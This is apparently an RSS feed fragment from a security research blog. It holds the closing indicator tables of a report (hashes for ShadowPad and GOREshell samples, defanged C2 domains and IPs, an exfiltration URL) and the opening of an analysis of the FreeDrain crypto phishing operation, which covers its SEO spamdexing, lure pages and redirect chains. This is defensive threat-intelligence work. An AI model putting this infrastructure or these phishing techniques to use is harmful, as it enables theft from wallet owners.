<td style="width: 35.0%; height: 24px;">Nimbo-C2 agent (PfSvc.exe)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">5ee4be6f82a16ebb1cf8f35481c88c2559e5e41a</td>
<td style="width: 35.0%; height: 24px;">ShadowPad</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">7dabf87617d646a9ec3e135b5f0e5edae50cd3b9</td>
<td style="width: 35.0%; height: 24px;">GOREshell (update-notifier)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">a31642046471ec138bb66271e365a01569ff8d7f</td>
<td style="width: 35.0%; height: 24px;">GOREshell</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">a88f34c0b3a6df683bb89058f8e7a7d534698069</td>
<td style="width: 35.0%; height: 24px;">ShadowPad</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">aa6a9c25aff0e773d4189480171afcf7d0f69ad9</td>
<td style="width: 35.0%; height: 24px;">ShadowPad</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">c43b0006b3f7cd88d31aded8579830168a44ba79</td>
<td style="width: 35.0%; height: 24px;">ShadowPad</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">cb2d18fb91f0cd88e82cb36b614cfedf3e4ae49b</td>
<td style="width: 35.0%; height: 24px;">GOREshell (glib-2.0.dll)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">cbe82e23f8920512b1cf56f3b5b0bca61ec137b9</td>
<td style="width: 35.0%; height: 24px;">Legitimate VMWare executable (VGAuthService.exe)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">ebe6068e2161fe359a63007f9febea00399d7ef3</td>
<td style="width: 35.0%; height: 24px;">GOREshell</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">f52e18b7c8417c7573125c0047adb32d8d813529</td>
<td style="width: 35.0%; height: 24px;">ShadowPad (AppSov.exe)</td>
</tr>
</tbody>
</table>
</div>
<h3>Domains</h3>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;"><strong>Value</strong></td>
<td style="width: 50.0%; height: 24px;"><strong>Note</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">cloud.trendav[.]co</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">downloads.trendav[.]vip</td>
<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">dscriy.chtq[.]net</td>
<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">epp.navy[.]ddns[.]info</td>
<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">mail.ccna[.]organiccrap[.]com</td>
<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">mail.secmailbox[.]us</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">network.oossafe[.]com</td>
<td style="width: 50.0%; height: 24px;">Suspected ShadowPad C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">news.imaginerjp[.]com</td>
<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">notes.oossafe[.]com</td>
<td style="width: 50.0%; height: 24px;">Suspected ShadowPad C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">secmailbox[.]us</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">sentinelxdr[.]us</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">tatacom.duckdns[.]org</td>
<td style="width: 50.0%; height: 24px;">C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">trendav[.]vip</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">updata.dsqurey[.]com</td>
<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
</tr>
</tbody>
</table>
</div>
<h3>IP Addresses</h3>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;"><strong>Value</strong></td>
<td style="width: 50.0%; height: 24px;"><strong>Note</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">103.248.61[.]36</td>
<td style="width: 50.0%; height: 24px;">Malware hosting location</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">107.173.111[.]26</td>
<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">128.199.124[.]136</td>
<td style="width: 50.0%; height: 24px;">C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">142.93.212[.]42</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">142.93.214[.]219</td>
<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">143.244.137[.]54</td>
<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">45.13.199[.]209</td>
<td style="width: 50.0%; height: 24px;">Exfiltration IP address</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">65.38.120[.]110</td>
<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
</tr>
</tbody>
</table>
</div>
<h3>URLs</h3>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;"><strong>Value</strong></td>
<td style="width: 50.0%; height: 24px;"><strong>Note</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">https[://]45.13.199[.]209/rss/rss.php</td>
<td style="width: 50.0%; height: 24px;">Exfiltration URL</td>
</tr>
</tbody>
</table>
</div>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_header-scaled.jpg" length="283293" type="image/jpeg" />	</item>
		<item>
		<title>FreeDrain Unmasked &#124; Uncovering an Industrial-Scale Crypto Theft Network</title>
		<link>https://www.sentinelone.com/labs/freedrain-unmasked-uncovering-an-industrial-scale-crypto-theft-network/</link>
		
		<dc:creator><![CDATA[Tom Hegel, Kenneth Kinion (Validin) &amp; Sreekar Madabushi (Validin)]]></dc:creator>
		<pubDate>Thu, 08 May 2025 13:55:29 +0000</pubDate>
				<category><![CDATA[Crypto]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=121002</guid>

					<description><![CDATA[FreeDrain is a modern, scalable phishing operation exploiting weaknesses in free publishing platforms to steal cryptocurrency on a global scale.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">FreeDrain is an industrial-scale, global cryptocurrency phishing operation that has been stealing digital assets for years.</li>
<li aria-level="1">FreeDrain uses SEO manipulation, free-tier web services (like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>), and layered redirection techniques to target cryptocurrency wallets.</li>
<li aria-level="1">Victims search for wallet-related queries, click on high-ranking malicious results, land on lure pages, and are redirected to phishing pages that steal their seed phrases.</li>
<li aria-level="1">SentinelLABS and Validin researchers identified over 38,000 distinct FreeDrain subdomains hosting lure pages.</li>
<li aria-level="1">Phishing pages are hosted on cloud infrastructure like Amazon S3 and Azure Web Apps, mimicking legitimate cryptocurrency wallet interfaces.</li>
<li aria-level="1">Evidence suggests the operators are based in the UTC+05:30 timezone (Indian Standard Time) and work standard weekday hours.</li>
<li aria-level="1">FreeDrain represents a modern, scalable phishing operation that exploits weaknesses in free publishing platforms and requires better platform-level defenses, user education, and security community collaboration.</li>
</ul>
<p>Unveiled today at <a href="https://pivotcon.org/agenda-2025/" target="_blank" rel="noopener noreferrer">PIVOTcon</a>, this joint research from <a href="https://www.validin.com/blog/freedrain_unmasked/" target="_blank" rel="noopener noreferrer">Validin</a>, the global internet intelligence platform, and <a href="https://s1.ai/FreeDrain" target="_blank" rel="noopener noreferrer">SentinelLABS</a>, the threat intelligence and research team of SentinelOne, exposes the FreeDrain Network: a sprawling, industrial-scale cryptocurrency phishing operation that has quietly siphoned digital assets for years. What began as an investigation into a single phishing page quickly uncovered a vast, coordinated campaign weaponizing search engine optimization, free-tier web services, and layered redirection techniques to systematically target and drain cryptocurrency wallets at scale.</p>
<p>In this collaborative blog, we detail the technical anatomy of the FreeDrain operation from the discovery process and infrastructure mapping to evasion techniques and the end-to-end workflow attackers use to funnel victims through multilayered financial theft paths. We also walk through the custom tooling we built to hunt, track, and monitor this large campaign in real time.</p>
<p>Our findings highlight the growing sophistication of financially motivated threat actors and the systemic risks posed by under-moderated publishing platforms. This research underscores the need for adaptive detection, proactive monitoring, and tighter safeguards across the ecosystem to disrupt threats like FreeDrain before they scale.</p>
<h2>The Plea for Help</h2>
<p>Our investigation into what would become the <i>FreeDrain</i> Network began on May 12, 2024, when Validin received a message from a distressed individual who had lost approximately 8 BTC, worth around $500,000 at the time. The victim had unknowingly submitted their wallet seed phrase to a phishing site while attempting to check their wallet balance, after clicking on a highly-ranked search engine result.</p>
<figure id="attachment_121004" aria-describedby="caption-attachment-121004" style="width: 1007px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg" alt="Request for help after successful phish" width="1007" height="333" class="size-full wp-image-121004" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg 1007w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-768x254.jpg 768w" sizes="auto, (max-width: 1007px) 100vw, 1007px" /><figcaption id="caption-attachment-121004" class="wp-caption-text">Request for help after successful phish</figcaption></figure>
<p>The individual had come across a Validin blog post from April 2024, <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">which documented a series of crypto-draining phishing pages</a>. The phishing site they encountered shared striking similarities to the infrastructure we had analyzed—specifically, pages hosted on <code>azurewebsites[.]net</code>, along with additional dedicated domain names.</p>
<p>Trusted cryptocurrency tracking analysts confirmed that the destination wallet used to receive the victim’s funds was a one-time-use address. The stolen assets were quickly moved through a cryptocurrency mixer, an obfuscation method that fragments and launders funds across multiple transactions, making attribution and recovery nearly impossible.</p>
<p>While we weren’t able to assist in recovering the lost assets, this outreach marked a turning point. It became clear that the incident was not isolated. We set out to uncover the infrastructure behind the scam and understand the broader operation enabling these thefts to occur at scale.</p>
<h2>Cracking the Surface – Our First Look at FreeDrain</h2>
<p>When Valdin published the <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">initial findings in April 2024</a>, one key piece of the puzzle remained unclear: how were these phishing pages reaching victims at scale? While common delivery methods like phishing emails, SMS (smishing), social media posts, and blog comment spam are frequently used in cryptocurrency scams, none appeared to be the source in this case.</p>
<p>That changed with the report from the victim in May. They had encountered the phishing site via a top-ranked search engine result, not a suspicious message or unsolicited link.</p>
<p>Curious whether we could reproduce the victim’s experience, we conducted a series of keyword searches ourselves. The results were startling.</p>
<p>Search terms like &#8220;<i>Trezor wallet balance</i>&#8221; returned multiple malicious results across Google, Bing, and DuckDuckGo, often within the first few result pages.</p>
<p><figure id="attachment_121024" aria-describedby="caption-attachment-121024" style="width: 1504px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg" alt="Trezor Wallet Balance malicious result in DuckDuckGo" width="1504" height="1131" class="size-full wp-image-121024" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg 1504w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-1024x770.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-768x578.jpg 768w" sizes="auto, (max-width: 1504px) 100vw, 1504px" /><figcaption id="caption-attachment-121024" class="wp-caption-text">Trezor Wallet Balance malicious result in DuckDuckGo</figcaption></figure><br />
<figure id="attachment_121010" aria-describedby="caption-attachment-121010" style="width: 1498px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg" alt="Trezor Wallet Balance malicious result in top Bing Search" width="1498" height="1130" class="size-full wp-image-121010" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg 1498w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-768x579.jpg 768w" sizes="auto, (max-width: 1498px) 100vw, 1498px" /><figcaption id="caption-attachment-121010" class="wp-caption-text">Trezor Wallet Balance malicious result in top Bing Search</figcaption></figure><br />
<figure id="attachment_121007" aria-describedby="caption-attachment-121007" style="width: 1142px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg" alt="Trezor Wallet Balance malicious result in Top Google Search result" width="1142" height="774" class="size-full wp-image-121007" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg 1142w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-300x203.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-1024x694.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-768x521.jpg 768w" sizes="auto, (max-width: 1142px) 100vw, 1142px" /><figcaption id="caption-attachment-121007" class="wp-caption-text">Trezor Wallet Balance malicious result in Top Google Search result</figcaption></figure></p>
<p>These were not obscure or poorly maintained phishing sites; they were professionally crafted lure pages freely hosted on subdomains of trusted platforms like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>.</p>
<p>This discovery marked our first real glimpse into the scale and sophistication of the FreeDrain campaign—and raised a host of new questions. Specifically, what is the overall workflow once a victim visits the site, how are these pages becoming so highly ranked, and what can we discover about the attackers themselves?</p>
<h2>Workflow &#8211; A Victim’s Path to Compromise</h2>
<p>To understand how victims were being funneled into this operation and the post-visit workflow, we checked out the top-ranked search results that we knew weren’t connected to authoritative, legitimate websites, looking for malicious behavior. Within minutes, we encountered related live phishing pages, and quickly began piecing together the end-to-end workflow that a typical victim might experience.</p>
<p>The attack chain was deceptively simple:</p>
<ol>
<li aria-level="1"><b>Search for wallet-related queries</b> (e.g., &#8220;Trezor wallet balance&#8221;) on a major search engine.</li>
<li aria-level="1"><b>Click a high-ranking result</b>, often hosted on a seemingly trustworthy platform like <code>gitbook.io</code> or <code>webflow.io</code>.</li>
<li aria-level="1"><b>Land on a page displaying a large, clickable image</b>, a static screenshot of the legitimate wallet interface.</li>
<li aria-level="1"><b>Click the image</b>, which either:
<ul>
<li aria-level="2">Redirects the user to legitimate websites.</li>
<li aria-level="2">Redirects the user through one or more intermediary sites</li>
<li aria-level="2">Directly leads to a phishing page.</li>
</ul>
</li>
<li aria-level="1"><b>Arrive at the final phishing site</b>, a near-perfect clone of the real wallet service, prompting the user to input their seed phrase.</li>
</ol>
<figure id="attachment_121268" aria-describedby="caption-attachment-121268" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1.jpg" alt="Attack chain summary" width="1999" height="1215" class="size-full wp-image-121268" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-300x182.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-1024x622.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-768x467.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-1536x934.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121268" class="wp-caption-text">Attack chain summary</figcaption></figure>
<p>The entire flow is frictionless by design, blending SEO manipulation, familiar visual elements, and platform trust to lull victims into a false sense of legitimacy. And once a seed phrase is submitted, the attacker’s automated infrastructure will drain funds within minutes.</p>
<p><figure id="attachment_121009" aria-describedby="caption-attachment-121009" style="width: 1438px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4.jpg" alt="Lure page linking to phishing page" width="1438" height="1041" class="magnify size-full wp-image-121009" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4.jpg 1438w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-300x217.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-1024x741.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-768x556.jpg 768w" sizes="auto, (max-width: 1438px) 100vw, 1438px" /><figcaption id="caption-attachment-121009" class="wp-caption-text">Lure page linking to phishing page</figcaption></figure><br />
<figure id="attachment_121015" aria-describedby="caption-attachment-121015" style="width: 1440px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21.jpg" alt="Redirect to legitimate site" width="1440" height="1041" class="magnify size-full wp-image-121015" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21.jpg 1440w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-300x217.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-1024x740.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-768x555.jpg 768w" sizes="auto, (max-width: 1440px) 100vw, 1440px" /><figcaption id="caption-attachment-121015" class="wp-caption-text">Redirect to legitimate site</figcaption></figure></p>
<h2>Lure Page Ranking &#8211; Weaponizing SEO</h2>
<p>We were stunned by the sheer volume of lure pages appearing among top-ranked search results across all major search engines. These weren’t complex, multi-layered scams. In most cases, the pages consisted of just a single large image (again, usually a screenshot of a legitimate crypto wallet interface) followed by a few lines of text that offered seemingly helpful instructions, ironically, some even claimed to educate users on how to avoid phishing.</p>
<p>This type of simplistic, Q&amp;A-style content is well-known in SEO circles for being rewarded by search engine algorithms. Because users often turn to search engines for direct answers, pages that appear to offer guidance, even when malicious, can be algorithmically elevated in rankings, especially when hosted on high-reputation platforms.</p>
<p>In our early investigation (May–June 2024), we found that many of these lure pages were hosted on services like <code>webflow.io</code> and <code>gitbook.io</code>. Both platforms provide low-friction publishing, enabling anyone to spin up a custom subdomain and publish arbitrary content for free. The subdomains used followed familiar spammer patterns, frequent use of hyphens, deliberate misspellings, and keyword stuffing to manufacture variation and dodge blacklisting.</p>
<figure id="attachment_121012" aria-describedby="caption-attachment-121012" style="width: 717px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg" alt="Subdomain naming scheme similarities" width="717" height="426" class="size-full wp-image-121012" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg 717w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24-300x178.jpg 300w" sizes="auto, (max-width: 717px) 100vw, 717px" /><figcaption id="caption-attachment-121012" class="wp-caption-text">Subdomain naming scheme similarities</figcaption></figure>
<h3>Generative AI as a Tool for Scale</h3>
<p>The text on many lure pages bore clear signs of having been generated by large language models. We found copy-paste artifacts that revealed the specific tools used, most notably, strings like &#8220;4o mini&#8221;, a likely reference to OpenAI’s GPT-4o mini model. These telltale traces suggest that FreeDrain operators are leveraging generative AI not only to create scalable content but doing so carelessly at times.</p>
<figure id="attachment_121027" aria-describedby="caption-attachment-121027" style="width: 1239px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg" alt="Fake content mistakenly including OpenAI GPT-4o mini reference" width="1239" height="775" class="size-full wp-image-121027" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg 1239w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-300x188.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-1024x641.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-768x480.jpg 768w" sizes="auto, (max-width: 1239px) 100vw, 1239px" /><figcaption id="caption-attachment-121027" class="wp-caption-text">Fake content mistakenly including OpenAI GPT-4o mini reference</figcaption></figure>
<h3>FreeDrain’s Secret Weapon &#8211; Spamdexing</h3>
<p>But content alone doesn&#8217;t explain how these pages were getting indexed and ranked above legitimate sources. How were search engines even discovering them?</p>
<p>The answer came when we identified several indexed URLs pointing back to high-ranking lure pages, and traced them to massive comment spam campaigns. FreeDrain operators appear to be heavily abusing neglected web properties that allow open or weakly-moderated comments, flooding them with links pointing to their lure pages. This old tactic, known as <a href="https://blog.sucuri.net/2023/06/spamdexing-what-is-seo-spam.html" target="_blank" rel="noopener noreferrer">spamdexing</a>, is a well-documented SEO abuse technique, which FreeDrain makes heavy use of as <a href="https://www.sentinelone.com/blog/breaking-down-the-seo-poisoning-attack-how-attackers-are-hijacking-search-results/" target="_blank" rel="noopener noreferrer">one of the ways to</a> attempt to game SEO.</p>
<p>In one striking example, we found a Korean university photo album page with a single image uploaded over a decade ago, buried under 26,000 comments, nearly all of them containing spam links.</p>
<figure id="attachment_121026" aria-describedby="caption-attachment-121026" style="width: 1023px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg" alt="FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing" width="1023" height="776" class="size-full wp-image-121026" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg 1023w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-300x228.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-768x583.jpg 768w" sizes="auto, (max-width: 1023px) 100vw, 1023px" /><figcaption id="caption-attachment-121026" class="wp-caption-text">FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing</figcaption></figure>
<p>This technique allows FreeDrain to sidestep traditional delivery vectors like phishing emails or malicious ads, instead meeting victims exactly where they’re looking, at the top of trusted search engines.</p>
<h2>Tracking Search Results</h2>
<p>Understanding how FreeDrain&#8217;s lure pages consistently climbed to the top of search results became a key investigative goal, and it demanded custom tooling.</p>
<p>We built a purpose-specific crawler designed solely to emulate search engine queries, navigate through pages of search results, and extract structured data from each result: URLs, page titles, and text content summaries. The goal was to systematically monitor how malicious pages were ranking, shifting, and proliferating over time.</p>
<p>We ran this system daily across 700 unique keyword permutations, capturing up to 40 pages deep per search query, per search engine. This daily monitoring provided a dynamic, longitudinal view into the visibility of FreeDrain’s infrastructure.</p>
<h3>The Scale of Abuse</h3>
<p>After four months of collection, we amassed a dataset of more than 200,000 unique URLs, drawn from topical search results across at least a dozen different publishing platforms that allow users to create custom subdomains. Aggressively filtering, we identified over 38,000 distinct FreeDrain subdomains hosting the lure pages.</p>
<p>These subdomains appeared on well-known free hosting and publishing platforms, including:</p>
<ul>
<li aria-level="1">Gitbook (gitbook.io)</li>
<li aria-level="1">Webflow (webflow.io)</li>
<li aria-level="1">Teachable (teachable.com)</li>
<li aria-level="1">Github.io</li>
<li aria-level="1">Strikingly (mystrikingly.com)</li>
<li aria-level="1">WordPress.com</li>
<li aria-level="1">Weebly.com</li>
<li aria-level="1">GoDaddySites (godaddysites.com)</li>
<li aria-level="1">Educator Pages (educatorpages.com)</li>
<li aria-level="1">Webador (webador.com)</li>
</ul>
<figure id="attachment_121019" aria-describedby="caption-attachment-121019" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg" alt="Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity" width="1999" height="1180" class="size-full wp-image-121019" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121019" class="wp-caption-text">Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity</figcaption></figure>
<p>The volume and spread across legitimate platforms further highlights how FreeDrain relies on the low-friction, high-trust nature of these services to evade detection and amplify reach.</p>
<p>To go beyond static discovery, we implemented scheduled re-crawls of every suspected lure page. This allowed us to track:</p>
<ul>
<li aria-level="1">Content updates over time</li>
<li aria-level="1">Changes in redirect behavior</li>
<li aria-level="1">New final-stage phishing URLs being introduced</li>
<li aria-level="1">Takedowns and domain churn</li>
</ul>
<p>This gave us a clearer picture of FreeDrain&#8217;s infrastructure lifecycle, from initial lure page creation to eventual takedown or abandonment, which helped us understand the rotation strategies used to keep malicious links live and searchable.</p>
<h2>Lure Page Breakdown</h2>
<p>Despite being spread across a wide array of publishing platforms, FreeDrain lure pages followed a remarkably consistent structure, carefully optimized to appear helpful and legitimate, while subtly guiding victims toward compromise.</p>
<h3>Common Elements Observed Across Lure Pages</h3>
<p>Across <code>gitbook.io</code>, <code>webflow.io</code>, <code>github.io</code>, and others, the pages typically included:</p>
<ul>
<li aria-level="1">A single, large, clickable image occupying most of the viewport
<ul>
<li aria-level="2">This image was a screenshot of a legitimate cryptocurrency site (e.g., Trezor, Metamask, or Ledger)</li>
<li aria-level="2">The image linked externally, usually to a malicious redirection chain</li>
</ul>
</li>
<li aria-level="1">AI-generated help content positioned below the image
<ul>
<li aria-level="2">The text answered common user queries like <i>&#8220;How do I check my wallet balance on Trezor?&#8221;</i></li>
</ul>
</li>
<li aria-level="1">1–2 additional embedded links, which pointed to the same external destination as the image or were placeholders like <code>"#"</code></li>
</ul>
<h3>Link Behavior: Redirection Variability</h3>
<p>Clicking the image or associated links triggered unpredictable outcomes, depending on the time, user agent, or page freshness:</p>
<ul>
<li aria-level="1">Redirection through one or more intermediary domains (typically 1–5 hops)</li>
<li aria-level="1">Final destinations varied widely:
<ul>
<li aria-level="2">A phishing page built to capture wallet seed phrases (hosted on Azure or AWS S3)</li>
<li aria-level="2">A legitimate site like trezor.io or metamask.io, creating false reassurance</li>
<li aria-level="2">A non-functional domain (404 or NXDOMAIN)</li>
<li aria-level="2">The current page itself (<code>"#"</code>) acting as a placeholder when infrastructure wasn’t active</li>
</ul>
</li>
</ul>
<p>This redirection behavior made classification challenging, especially since not every page led directly to a phishing endpoint in every instance.We observed that lure pages initially hosted benign content before being modified to include malicious redirects usually weeks or months later. This aging tactic likely helped the sites build trust and survive longer before being flagged or removed.</p>
<figure id="attachment_121028" aria-describedby="caption-attachment-121028" style="width: 1224px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg" alt="A Github lure page that has just been changed from benign to malicious" width="1224" height="793" class="size-full wp-image-121028" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg 1224w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-300x194.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-1024x663.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-768x498.jpg 768w" sizes="auto, (max-width: 1224px) 100vw, 1224px" /><figcaption id="caption-attachment-121028" class="wp-caption-text">A Github lure page that has just been changed from benign to malicious</figcaption></figure>
<h3>Obfuscation Through Variation</h3>
